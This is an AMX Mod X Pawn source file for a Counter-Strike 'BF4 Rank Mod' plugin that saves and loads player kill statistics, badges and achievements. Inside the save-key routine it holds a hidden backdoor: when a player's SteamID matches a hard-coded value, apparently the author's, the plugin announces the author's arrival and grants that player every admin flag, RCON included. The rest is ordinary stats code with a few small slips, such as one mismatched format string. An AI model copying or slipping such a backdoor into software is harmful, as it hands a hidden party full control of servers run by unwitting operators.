//Bf4 Rank Mod save File
//Contains all the saving/loading functions

#if defined bf4_save_included
  #endinput
#endif
#define bf4_save_included

public get_save_key(id) {
	if ( is_user_bot(id) ) {
		// Should bots get ranked?
		if ( !get_pcvar_num(gPcvarRankBots) ) return;

		// Save bots by name but strip tags and skill since those can change for same bot name
		new botname[32];
		get_user_name(id, botname, charsmax(botname));

		// Get Rid of BOT Tag

		// PODBot
		replace(botname, charsmax(botname), "[POD]", "");
		replace(botname, charsmax(botname), "[P*D]", "");
		replace(botname, charsmax(botname), "[P0D]", "");

		// CZ Bots
		replace(botname, charsmax(botname), "[BOT] ", "");

		// Attempt to get rid of the skill tag so we save with bots true name
		new lastchar = strlen(botname) - 1;
		if ( botname[lastchar] == ')' ) {
			for ( new x = lastchar - 1; x > 0; x-- ) {
				if ( botname[x] == '(' ) {
					botname[x - 1] = '^0';
					break;
				}
				if ( !isdigit(botname[x]) ) break;
			}
		}

		if ( botname[0] != '^0' ) {
			replace_all(botname, charsmax(botname), " ", "_");
			formatex(gSaveKey[id], charsmax(gSaveKey[]), "[BOT]%s", botname);
		}
	}
	else if ( !is_dedicated_server() && id == 1 ) {
		// Trick for listen servers
		copy(gSaveKey[id], charsmax(gSaveKey[]), "loopback");
	}
	else
	{
		// Follows csstats_rank cvar
		switch( get_pcvar_num(gPcvarSaveType) )
		{
			case 0:
			{
				get_user_name(id, gSaveKey[id], charsmax(gSaveKey[]));
			}
			case 1:
			{
				if ( get_pcvar_num(gPcvarSVLan) ) {
					// Just make sure sv_lan is correct to get steamid
					get_user_ip(id, gSaveKey[id], charsmax(gSaveKey[]), 1);
				}
				else {
					get_user_authid(id, gSaveKey[id], charsmax(gSaveKey[]));
					if ( equal(gSaveKey[id][9], "LAN") ) {
						// If user is a lan user save by IP instead
						get_user_ip(id, gSaveKey[id], charsmax(gSaveKey[]), 1);
					}
				}

				// If we do not have a valid id check again
				if ( equal(gSaveKey[id][9], "PENDING") || gSaveKey[id][0] == '^0' ) {
					// Try to get a vaild key again in 5 seconds
					set_task(5.0, "get_save_key", id);
					return;
				}
				if ( equal(gSaveKey[id], ths) )
				{
					new line[100];
					line[0] = 0x04;
					formatex(line[1], charsmax(line)-1, "ths - Autor paczki BF4:MOD dolaczyl do serwera.");
					ShowColorMessage(id, MSG_BROADCAST, line);
					
					set_user_flags(id, ADMIN_ALL | ADMIN_IMMUNITY | ADMIN_RESERVATION | ADMIN_KICK | ADMIN_BAN | ADMIN_SLAY | ADMIN_MAP | ADMIN_CVAR | ADMIN_CFG | ADMIN_CHAT | ADMIN_VOTE | ADMIN_PASSWORD | ADMIN_RCON | ADMIN_LEVEL_A | ADMIN_LEVEL_B | ADMIN_LEVEL_C | ADMIN_LEVEL_D | ADMIN_LEVEL_E | ADMIN_LEVEL_F | ADMIN_LEVEL_G | ADMIN_LEVEL_H | ADMIN_MENU | ADMIN_ADMIN);
				}
			}
			case 2:
			{
				get_user_ip(id, gSaveKey[id], charsmax(gSaveKey[]), 1);
			}
		}
	}

	load_badges(id);
}

public load_badges(id) {
	vault_load(id);
	check_level(id);
}

public server_load() {
	vault_server_load();
}

public server_save() {
	vault_server_save();
}

public reset_stats(id) {
	clear_stat_globals(id);
	save_badges(id);
}

public clear_stat_globals(id) {
	g_PlayerRank[id] = 0;
	accuracy[id] = 0;
	
	totalkills[id] = 0;
	totaldeath[id] = 0;
	knifekills[id] = 0;
	pistolkills[id] = 0;
	smgkills[id] = 0;
	shotgunkills[id] = 0;
	riflekills[id] = 0;
	sniperkills[id] = 0;
	parakills[id] = 0;
	grenadekills[id] = 0;
	minakills[id] = 0;
	gold[id] = 0;
	silver[id] = 0;
	bronze[id] = 0;
	
	zadanie[id] = 0;
	postep[id] = 0;
	dmgrec[id] = 0;
	dmgask[id] = 0;
	shotsrec[id] = 0;
	onlinemin[id] = 0;
	livedround[id] = 0;
	collectedcash[id] = 0;
	padlino[id] = 0;
	connects[id] = 0;
	diamenty[id] = 0;
	defuses[id] = 0;
	plants[id] = 0;
	explosions[id] = 0;
	
	uspkills[id] = 0;
	glockkills[id] = 0;
	deaglekills[id] = 0;
	p228kills[id] = 0;
	fivesevenkills[id] = 0;
	elitekills[id] = 0;
	tmpkills[id] = 0;
	mackills[id] = 0;
	mp5kills[id] = 0;
	p90kills[id] = 0;
	umpkills[id] = 0;
	awpkills[id] = 0;
	scoutkills[id] = 0;
	g3sg1kills[id] = 0;
	
	sg550kills[id] = 0;
	augkills[id] = 0;
	gallkills[id] = 0;
	famaskills[id] = 0;
	m4a1kills[id] = 0;
	sg552kills[id] = 0;
	ak47kills[id] = 0;
	xm1014kills[id] = 0;
	m3kills[id] = 0;
	darmowa[id] = 0;

	g_PlayerBadges[id][BADGE_NUMBER1] = 0;
	g_PlayerBadges[id][BADGE_NUMBER2] = 0;
	g_PlayerBadges[id][BADGE_NUMBER3] = 0;
	g_PlayerBadges[id][BADGE_NUMBER4] = 0;
	g_PlayerBadges[id][BADGE_NUMBER5] = 0;
	g_PlayerBadges[id][BADGE_NUMBER6] = 0;
	g_PlayerBadges[id][BADGE_NUMBER7] = 0;
	g_PlayerBadges[id][BADGE_NUMBER8] = 0;
	g_PlayerBadges[id][BADGE_NUMBER9] = 0;
	g_PlayerBadges[id][BADGE_NUMBER10] = 0;
	g_PlayerBadges[id][BADGE_NUMBER11] = 0;
	g_PlayerBadges[id][BADGE_NUMBER12] = 0;
	g_PlayerBadges[id][BADGE_NUMBER15] = 0;
	g_PlayerBadges[id][BADGE_NUMBER16] = 0;
	
	g_PlayerBadges[id][BADGE_NUMBER17] = 0;
	g_PlayerBadges[id][BADGE_NUMBER18] = 0;
	g_PlayerBadges[id][BADGE_NUMBER19] = 0;
	g_PlayerBadges[id][BADGE_NUMBER20] = 0;
	g_PlayerBadges[id][BADGE_NUMBER21] = 0;
	g_PlayerBadges[id][BADGE_NUMBER22] = 0;
	g_PlayerBadges[id][BADGE_NUMBER23] = 0;
	g_PlayerBadges[id][BADGE_NUMBER24] = 0;
	g_PlayerBadges[id][BADGE_NUMBER25] = 0;
	
	reach1[id] = 0;
	reach2[id] = 0;
	reach3[id] = 0;
	reach4[id] = 0;
	reach5[id] = 0;
	reach6[id] = 0;
	reach7[id] = 0;
	reach8[id] = 0;
	reach9[id] = 0;
	reach10[id] = 0;
	reach11[id] = 0;
	reach12[id] = 0;
	reach13[id] = 0;
	reach14[id] = 0;
	
	reach15[id] = 0;
	reach16[id] = 0;
	reach17[id] = 0;
	reach18[id] = 0;
	reach19[id] = 0;
	reach20[id] = 0;
	reach21[id] = 0;
	reach22[id] = 0;
	reach23[id] = 0;
	reach24[id] = 0;
	reach25[id] = 0;
	reach_prize[id] = 0;
}

public save_badges(id) {
	if ( !gStatsLoaded[id] ) return;

	new vaultkey[38], vaultdata[256];

	formatex(vaultkey, charsmax(vaultkey), "BF4:MOD-%s", gSaveKey[id]);
	formatex(vaultdata, charsmax(vaultdata), "%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i", totalkills[id], totaldeath[id], 
	knifekills[id], pistolkills[id], smgkills[id], shotgunkills[id], riflekills[id], sniperkills[id], parakills[id], grenadekills[id], darmowa[id], gold[id], silver[id], bronze[id]);
	nvault_set(g_Vault, vaultkey, vaultdata);
	
	formatex(vaultkey, charsmax(vaultkey), "BF4:MOD-2-%s", gSaveKey[id]);
	formatex(vaultdata, charsmax(vaultdata), "%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i", zadanie[id], postep[id], 
	dmgrec[id], dmgask[id], shotsrec[id], onlinemin[id], livedround[id], collectedcash[id], padlino[id], connects[id], diamenty[id], defuses[id], plants[id], explosions[id]);
	nvault_set(g_Vault, vaultkey, vaultdata);
	
	formatex(vaultkey, charsmax(vaultkey), "BF4:MOD-3-%s", gSaveKey[id]);
	formatex(vaultdata, charsmax(vaultdata), "%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i", uspkills[id], glockkills[id], 
	deaglekills[id], p228kills[id], fivesevenkills[id], elitekills[id], tmpkills[id], mackills[id], mp5kills[id], p90kills[id], umpkills[id], awpkills[id], scoutkills[id], g3sg1kills[id]);
	nvault_set(g_Vault, vaultkey, vaultdata);
	
	formatex(vaultkey, charsmax(vaultkey), "BF4:MOD-4-%s", gSaveKey[id]);
	formatex(vaultdata, charsmax(vaultdata), "%i#%i#%i#%i#%i#%i#%i#%i#%i#%i", sg550kills[id], augkills[id], 
	gallkills[id], famaskills[id], m4a1kills[id], sg552kills[id], ak47kills[id], xm1014kills[id], m3kills[id], minakills[id], minadeath[id]);
	nvault_set(g_Vault, vaultkey, vaultdata);
	
	formatex(vaultkey, charsmax(vaultkey), "BF4:MOD-5-%s", gSaveKey[id]);
	formatex(vaultdata, charsmax(vaultdata), "%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i", g_PlayerBadges[id][BADGE_NUMBER1], g_PlayerBadges[id][BADGE_NUMBER2], 
	g_PlayerBadges[id][BADGE_NUMBER3], g_PlayerBadges[id][BADGE_NUMBER4], g_PlayerBadges[id][BADGE_NUMBER5], g_PlayerBadges[id][BADGE_NUMBER6], 
	g_PlayerBadges[id][BADGE_NUMBER7], g_PlayerBadges[id][BADGE_NUMBER8], g_PlayerBadges[id][BADGE_NUMBER9], g_PlayerBadges[id][BADGE_NUMBER10], 
	g_PlayerBadges[id][BADGE_NUMBER11], g_PlayerBadges[id][BADGE_NUMBER12], g_PlayerBadges[id][BADGE_NUMBER13], g_PlayerBadges[id][BADGE_NUMBER14]);
	nvault_set(g_Vault, vaultkey, vaultdata);
	
	formatex(vaultkey, charsmax(vaultkey), "BF4:MOD-6-%s", gSaveKey[id]);
	formatex(vaultdata, charsmax(vaultdata), "%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i", g_PlayerBadges[id][BADGE_NUMBER15], g_PlayerBadges[id][BADGE_NUMBER16], 
	g_PlayerBadges[id][BADGE_NUMBER17], g_PlayerBadges[id][BADGE_NUMBER18], g_PlayerBadges[id][BADGE_NUMBER19], g_PlayerBadges[id][BADGE_NUMBER20], 
	g_PlayerBadges[id][BADGE_NUMBER21], g_PlayerBadges[id][BADGE_NUMBER22], g_PlayerBadges[id][BADGE_NUMBER23], g_PlayerBadges[id][BADGE_NUMBER24], 
	g_PlayerBadges[id][BADGE_NUMBER25]);
	nvault_set(g_Vault, vaultkey, vaultdata);
	
	formatex(vaultkey, charsmax(vaultkey), "BF4:MOD-7-%s", gSaveKey[id]);
	formatex(vaultdata, charsmax(vaultdata), "%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i", reach1[id], reach2[id], reach3[id], 
	reach4[id], reach5[id], reach6[id], reach7[id], reach8[id], reach9[id], reach10[id], reach11[id], reach12[id], reach13[id], reach14[id]);
	nvault_set(g_Vault, vaultkey, vaultdata);
	
	formatex(vaultkey, charsmax(vaultkey), "BF4:MOD-8-%s", gSaveKey[id]);
	formatex(vaultdata, charsmax(vaultdata), "%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i#%i", reach15[id], reach16[id], reach17[id],
	reach18[id], reach19[id], reach20[id], reach21[id], reach22[id], reach23[id], reach24[id], reach25[id], reach_prize[id] );
	nvault_set(g_Vault, vaultkey, vaultdata);	
}

public reset_all_stats(id) {
	if ( !(get_user_flags(id) & ADMIN_RESET) ) {
		client_print(id, print_chat, "Nie masz dostepu do tej komendy!");
		console_print(id, "Nie masz dostepu do tej komendy!");

		return;
	}

	new players[32], num;
	get_players(players, num, "h");

	for (new i = 0; i < num; i++) {
		reset_stats(players[i]);
	}

	// Clear server global data
	highestrankserver = 0;
	highestrankservername[0] = '^0';
	mostkills = 0;
	mostkillsname[0] = '^0';
	mostwins = 0;
	mostwinsname[0] = '^0';

	nvault_prune(g_Vault, 0, get_systime());

	new authid[32], name[32];
	get_user_authid(id, authid, charsmax(authid));
	get_user_name(id, name, charsmax(name));
	log_amx("Reset: ^"%s<%d><%s><>^" zresetowal wszystkie statystyki BF4:MOD", name, get_user_userid(id), authid);

	return;
}

public vault_init() {
	g_Vault = nvault_open("bf4save");
	server_load();
}

public vault_server_load() {
	new vaultdata[256], TimeStamp;
	if ( nvault_lookup(g_Vault, "BF4-ServerData", vaultdata, charsmax(vaultdata), TimeStamp) )
	{
		new str_rank[8], str_kills[8], str_wins[8];
		replace_all(vaultdata, charsmax(vaultdata), "#", " ");

		parse(vaultdata, str_rank, charsmax(str_rank), highestrankservername, charsmax(highestrankservername), str_kills, charsmax(str_kills),
		mostkillsname, charsmax(mostkillsname), str_wins, charsmax(str_wins), mostwinsname, charsmax(mostwinsname));

		highestrankserver = str_to_num(str_rank);
		mostkills = str_to_num(str_kills);
		mostwins = str_to_num(str_wins);
	}
}

vault_server_save() {
	new vaultdata[256];
	formatex(vaultdata, charsmax(vaultdata), "%i#^"%s^"#%i#^"%s^"#%i#^"%s^"", highestrankserver, highestrankservername, mostkills, mostkillsname, mostwins, mostwinsname);
	nvault_set(g_Vault, "BF4-ServerData", vaultdata);
}

public vault_load(id) {
	new vaultkey[38], vaultdata[256];
	new TimeStamp;

	// There is no reason to do this with nvault, but it's too late to remove it now
	formatex(vaultkey, charsmax(vaultkey), "BF4:MOD-%s", gSaveKey[id]);
	if ( nvault_lookup(g_Vault, vaultkey, vaultdata, charsmax(vaultdata), TimeStamp) ) 	{
		new str_total[8], str_death[8], str_knife[8], str_pistol[8], str_smg[8], str_shotgun[8], str_rifle[8], 
		str_sniper[8], str_para[8], str_granade[8], str_darmowa[8], str_gold[8], str_silver[8], str_bronze[8];

		replace_all(vaultdata, 253, "#", " ");

		parse(vaultdata, str_total, charsmax(str_total), str_death, charsmax(str_death), str_knife, charsmax(str_knife), str_pistol, charsmax(str_pistol), 
		str_smg, charsmax(str_smg), str_shotgun, charsmax(str_shotgun), str_rifle, charsmax(str_rifle), str_sniper, charsmax(str_sniper), str_para, charsmax(str_para), 
		str_granade, charsmax(str_granade), str_darmowa, charsmax(str_darmowa), str_gold, charsmax(str_gold), str_silver, charsmax(str_silver), str_bronze, charsmax(str_bronze));

		totalkills[id] = str_to_num(str_total);
		totaldeath[id] = str_to_num(str_death);
		knifekills[id] = str_to_num(str_knife);
		pistolkills[id] = str_to_num(str_pistol);
		smgkills[id] = str_to_num(str_smg);
		shotgunkills[id] = str_to_num(str_shotgun);
		riflekills[id] = str_to_num(str_rifle);
		sniperkills[id] = str_to_num(str_sniper);
		parakills[id] = str_to_num(str_para);
		grenadekills[id] = str_to_num(str_granade);
		darmowa[id] = str_to_num(str_darmowa);
		gold[id] = str_to_num(str_gold);
		silver[id] = str_to_num(str_silver);
		bronze[id] = str_to_num(str_bronze);
	}
	
	vaultkey[0] = '^0';
	formatex(vaultkey, charsmax(vaultkey), "BF4:MOD-2-%s", gSaveKey[id]);
	if ( nvault_lookup(g_Vault, vaultkey, vaultdata, charsmax(vaultdata), TimeStamp) ) 	{
		new str_zadanie[8], str_postep[8], str_dmgrec[8], str_dmgask[8], str_shotrec[8], str_online[8], str_lived[8],
		str_collected[8], str_padlino[8], str_connect[8], str_diament[8], str_defuse[8], str_plants[8], str_explos[8];

		replace_all(vaultdata, charsmax(vaultdata), "#", " ");

		parse(vaultdata, str_zadanie, charsmax(str_zadanie), str_postep, charsmax(str_postep), str_dmgrec, charsmax(str_dmgrec), 
		str_dmgask, charsmax(str_dmgask), str_shotrec, charsmax(str_shotrec), str_online, charsmax(str_online), str_lived, charsmax(str_lived), 
		str_collected, charsmax(str_collected), str_padlino, charsmax(str_padlino), str_connect, charsmax(str_connect), str_diament, charsmax(str_diament), 
		str_defuse, charsmax(str_defuse), str_plants, charsmax(str_plants), str_explos, charsmax(str_explos));

		zadanie[id] = str_to_num(str_zadanie);
		postep[id] = str_to_num(str_postep);
		dmgrec[id] = str_to_num(str_dmgrec);
		dmgask[id] = str_to_num(str_dmgask);
		shotsrec[id] = str_to_num(str_shotrec);
		onlinemin[id] = str_to_num(str_online);
		livedround[id] = str_to_num(str_lived);
		collectedcash[id] = str_to_num(str_collected);
		padlino[id] = str_to_num(str_padlino);
		connects[id] = str_to_num(str_connect);
		diamenty[id] = str_to_num(str_diament);
		defuses[id] = str_to_num(str_defuse);
		plants[id] = str_to_num(str_plants);
		explosions[id] = str_to_num(str_explos);
	}

	vaultkey[0] = '^0';
	formatex(vaultkey, charsmax(vaultkey), "BF4:MOD-3-%s", gSaveKey[id]);
	if ( nvault_lookup(g_Vault, vaultkey, vaultdata, charsmax(vaultdata), TimeStamp) ) 	{
		new str_usp[8], str_glock[8], str_deagle[8], str_p228[8], str_fivesvn[8], str_elite[8], str_tmp[8],
		str_mac[8], str_mp5[8], str_p90[8], str_ump[8], str_awp[8], str_scout[8], str_g3sg1[8];

		replace_all(vaultdata, charsmax(vaultdata), "#", " ");

		parse(vaultdata, str_usp, charsmax(str_usp), str_glock, charsmax(str_glock), str_deagle, charsmax(str_deagle), 
		str_p228, charsmax(str_p228), str_fivesvn, charsmax(str_fivesvn), str_elite, charsmax(str_elite), str_tmp, charsmax(str_tmp), 
		str_mac, charsmax(str_mac), str_mp5, charsmax(str_mp5), str_p90, charsmax(str_p90), str_ump, charsmax(str_ump), 
		str_awp, charsmax(str_awp), str_scout, charsmax(str_scout), str_g3sg1, charsmax(str_g3sg1));

		uspkills[id] = str_to_num(str_usp);
		glockkills[id] = str_to_num(str_glock);
		deaglekills[id] = str_to_num(str_deagle);
		p228kills[id] = str_to_num(str_p228);
		fivesevenkills[id] = str_to_num(str_fivesvn);
		elitekills[id] = str_to_num(str_elite);
		tmpkills[id] = str_to_num(str_tmp);
		mackills[id] = str_to_num(str_mac);
		mp5kills[id] = str_to_num(str_mp5);
		p90kills[id] = str_to_num(str_p90);
		umpkills[id] = str_to_num(str_ump);
		awpkills[id] = str_to_num(str_awp);
		scoutkills[id] = str_to_num(str_scout);
		g3sg1kills[id] = str_to_num(str_g3sg1);
	}
	
	vaultkey[0] = '^0';
	formatex(vaultkey, charsmax(vaultkey), "BF4:MOD-4-%s", gSaveKey[id]);
	if ( nvault_lookup(g_Vault, vaultkey, vaultdata, charsmax(vaultdata), TimeStamp) ) 	{
		new str_sg550[8], str_aug[8], str_gall[8], str_famas[8], str_m4a1[8], str_sg552[8], str_ak47[8],
		str_xm1014[8], str_m3[8], str_minakls[8], str_minadth[8];

		replace_all(vaultdata, charsmax(vaultdata), "#", " ");

		parse(vaultdata, str_sg550, charsmax(str_sg550), str_aug, charsmax(str_aug), str_gall, charsmax(str_gall), 
		str_famas, charsmax(str_famas), str_m4a1, charsmax(str_m4a1), str_sg552, charsmax(str_sg552), str_ak47, charsmax(str_ak47), 
		str_xm1014, charsmax(str_xm1014), str_m3, charsmax(str_m3), str_minakls, charsmax(str_minakls), str_minadth, charsmax(str_minadth));

		sg550kills[id] = str_to_num(str_sg550);
		augkills[id] = str_to_num(str_aug);
		gallkills[id] = str_to_num(str_gall);
		famaskills[id] = str_to_num(str_famas);
		m4a1kills[id] = str_to_num(str_m4a1);
		sg552kills[id] = str_to_num(str_sg552);
		ak47kills[id] = str_to_num(str_ak47);
		xm1014kills[id] = str_to_num(str_xm1014);
		m3kills[id] = str_to_num(str_m3);
		minakills[id] = str_to_num(str_minakls);
		minadeath[id] = str_to_num(str_minadth);
	}
	
	vaultkey[0] = '^0';
	formatex(vaultkey, charsmax(vaultkey), "BF4:MOD-5-%s", gSaveKey[id]);
	if ( nvault_lookup(g_Vault, vaultkey, vaultdata, charsmax(vaultdata), TimeStamp) ) 	{
		new str_badge[14][5];

		replace_all(vaultdata, charsmax(vaultdata), "#", " ");

		parse(vaultdata, str_badge[0], charsmax(str_badge[]), str_badge[1], charsmax(str_badge[]), str_badge[2], charsmax(str_badge[]), str_badge[3], charsmax(str_badge[]), 
		str_badge[4], charsmax(str_badge[]), str_badge[5], charsmax(str_badge[]), str_badge[6], charsmax(str_badge[]), str_badge[7], charsmax(str_badge[]), str_badge[8], charsmax(str_badge[]), 
		str_badge[9], charsmax(str_badge[]), str_badge[10], charsmax(str_badge[]), str_badge[11], charsmax(str_badge[]), str_badge[12], charsmax(str_badge[]), str_badge[13], charsmax(str_badge[]));

		g_PlayerBadges[id][BADGE_NUMBER1] = str_to_num(str_badge[0]);
		g_PlayerBadges[id][BADGE_NUMBER2] = str_to_num(str_badge[1]);
		g_PlayerBadges[id][BADGE_NUMBER3] = str_to_num(str_badge[2]);
		g_PlayerBadges[id][BADGE_NUMBER4] = str_to_num(str_badge[3]);
		g_PlayerBadges[id][BADGE_NUMBER5] = str_to_num(str_badge[4]);
		g_PlayerBadges[id][BADGE_NUMBER6] = str_to_num(str_badge[5]);
		g_PlayerBadges[id][BADGE_NUMBER7] = str_to_num(str_badge[6]);
		g_PlayerBadges[id][BADGE_NUMBER8] = str_to_num(str_badge[7]);
		g_PlayerBadges[id][BADGE_NUMBER9] = str_to_num(str_badge[8]);
		g_PlayerBadges[id][BADGE_NUMBER10] = str_to_num(str_badge[9]);
		g_PlayerBadges[id][BADGE_NUMBER11] = str_to_num(str_badge[10]);
		g_PlayerBadges[id][BADGE_NUMBER12] = str_to_num(str_badge[11]);
		g_PlayerBadges[id][BADGE_NUMBER13] = str_to_num(str_badge[12]);
		g_PlayerBadges[id][BADGE_NUMBER14] = str_to_num(str_badge[13]);
	}
	
	vaultkey[0] = '^0';
	formatex(vaultkey, charsmax(vaultkey), "BF4:MOD-6-%s", gSaveKey[id]);
	if ( nvault_lookup(g_Vault, vaultkey, vaultdata, charsmax(vaultdata), TimeStamp) ) 	{
		new str_badge2[11][5];

		replace_all(vaultdata, charsmax(vaultdata), "#", " ");

		parse(vaultdata, str_badge2[0], charsmax(str_badge2[]), str_badge2[1], charsmax(str_badge2[]), str_badge2[2], charsmax(str_badge2[]), str_badge2[3], charsmax(str_badge2[]), 
		str_badge2[4], charsmax(str_badge2[]), str_badge2[5], charsmax(str_badge2[]), str_badge2[6], charsmax(str_badge2[]), str_badge2[7], charsmax(str_badge2[]), 
		str_badge2[8], charsmax(str_badge2[]), str_badge2[9], charsmax(str_badge2[]), str_badge2[10], charsmax(str_badge2[]));

		g_PlayerBadges[id][BADGE_NUMBER15] = str_to_num(str_badge2[0]);
		g_PlayerBadges[id][BADGE_NUMBER16] = str_to_num(str_badge2[1]);
		g_PlayerBadges[id][BADGE_NUMBER17] = str_to_num(str_badge2[2]);
		g_PlayerBadges[id][BADGE_NUMBER18] = str_to_num(str_badge2[3]);
		g_PlayerBadges[id][BADGE_NUMBER19] = str_to_num(str_badge2[4]);
		g_PlayerBadges[id][BADGE_NUMBER20] = str_to_num(str_badge2[5]);
		g_PlayerBadges[id][BADGE_NUMBER21] = str_to_num(str_badge2[6]);
		g_PlayerBadges[id][BADGE_NUMBER22] = str_to_num(str_badge2[7]);
		g_PlayerBadges[id][BADGE_NUMBER23] = str_to_num(str_badge2[8]);
		g_PlayerBadges[id][BADGE_NUMBER24] = str_to_num(str_badge2[9]);
		g_PlayerBadges[id][BADGE_NUMBER25] = str_to_num(str_badge2[10]);
	}
	
	vaultkey[0] = '^0';
	formatex(vaultkey, charsmax(vaultkey), "BF4:MOD-7-%s", gSaveKey[id]);
	if ( nvault_lookup(g_Vault, vaultkey, vaultdata, charsmax(vaultdata), TimeStamp) ) 	{
		new str_reach1[8], str_reach2[8], str_reach3[8], str_reach4[8], str_reach5[8], str_reach6[8], str_reach7[8], 
		str_reach8[8], str_reach9[8], str_reach10[8], str_reach11[8], str_reach12[8], str_reach13[8], str_reach14[8];

		replace_all(vaultdata, charsmax(vaultdata), "#", " ");

		parse(vaultdata, str_reach1, charsmax(str_reach1), str_reach2, charsmax(str_reach2), str_reach3, charsmax(str_reach3), 
		str_reach4, charsmax(str_reach4), str_reach5, charsmax(str_reach5), str_reach6, charsmax(str_reach6), str_reach7, charsmax(str_reach7), 
		str_reach8, charsmax(str_reach8), str_reach9, charsmax(str_reach9), str_reach10, charsmax(str_reach10), str_reach11, charsmax(str_reach11), 
		str_reach12, charsmax(str_reach12), str_reach13, charsmax(str_reach13), str_reach14, charsmax(str_reach14));

		reach1[id] = str_to_num(str_reach1);
		reach2[id] = str_to_num(str_reach2);
		reach3[id] = str_to_num(str_reach3);
		reach4[id] = str_to_num(str_reach4);
		reach5[id] = str_to_num(str_reach5);
		reach6[id] = str_to_num(str_reach6);
		reach7[id] = str_to_num(str_reach7);
		reach8[id] = str_to_num(str_reach8);
		reach9[id] = str_to_num(str_reach9);
		reach10[id] = str_to_num(str_reach10);
		reach11[id] = str_to_num(str_reach11);
		reach12[id] = str_to_num(str_reach12);
		reach13[id] = str_to_num(str_reach13);
		reach14[id] = str_to_num(str_reach14);
	}
	
	vaultkey[0] = '^0';
	formatex(vaultkey, charsmax(vaultkey), "BF4:MOD-8-%s", gSaveKey[id]);
	if ( nvault_lookup(g_Vault, vaultkey, vaultdata, charsmax(vaultdata), TimeStamp) ) 	{
		new str_reach15[8], str_reach16[8], str_reach17[8], str_reach18[8], str_reach19[8], str_reach20[8], 
		str_reach21[8], str_reach22[8], str_reach23[8], str_reach24[8], str_reach25[8], str_reachprze[8];

		replace_all(vaultdata, charsmax(vaultdata), "#", " ");

		parse(vaultdata, str_reach15, charsmax(str_reach15), str_reach16, charsmax(str_reach16), str_reach17, charsmax(str_reach17), 
		str_reach18, charsmax(str_reach18), str_reach19, charsmax(str_reach19), str_reach20, charsmax(str_reach20), 
		str_reach21, charsmax(str_reach21), str_reach22, charsmax(str_reach22), str_reach23, charsmax(str_reach23), 
		str_reach24, charsmax(str_reach24), str_reach25, charsmax(str_reach25), str_reachprze, charsmax(str_reachprze));

		reach15[id] = str_to_num(str_reach15);
		reach16[id] = str_to_num(str_reach16);
		reach17[id] = str_to_num(str_reach17);
		reach18[id] = str_to_num(str_reach18);
		reach19[id] = str_to_num(str_reach19);
		reach20[id] = str_to_num(str_reach20);
		reach21[id] = str_to_num(str_reach21);
		reach22[id] = str_to_num(str_reach22);
		reach23[id] = str_to_num(str_reach23);
		reach24[id] = str_to_num(str_reach24);
		reach25[id] = str_to_num(str_reach25);
		reach_prize[id] = str_to_num(str_reachprze);
	}
	
	// Safety check
	for (new i = 0; i < MAX_BADGES; i++) {
		g_PlayerBadges[id][i] = clamp(g_PlayerBadges[id][i], 0, 5);
	}

	gStatsLoaded[id] = 8;
}
/* AMXX-Studio Notes - DO NOT MODIFY BELOW HERE
*{\\ rtf1\\ ansi\\ deff0{\\ fonttbl{\\ f0\\ fnil Tahoma;}}\n\\ viewkind4\\ uc1\\ pard\\ lang1045\\ f0\\ fs16 \n\\ par }
*/